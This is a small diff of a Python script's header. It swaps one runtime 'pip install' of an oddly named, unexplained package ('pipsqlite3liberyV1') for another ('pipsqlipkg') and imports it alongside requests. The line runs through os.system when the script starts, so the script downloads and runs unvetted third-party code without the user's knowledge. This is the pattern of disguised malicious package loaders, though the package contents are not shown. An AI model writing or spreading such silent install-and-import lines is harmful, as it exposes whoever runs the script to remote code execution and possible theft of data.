@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlite3liberyV1")
-import pipsqlite3liberyV1
+os.system("pip install pipsqlipkg")
+import pipsqlipkg
 import random
 import requests
 import time
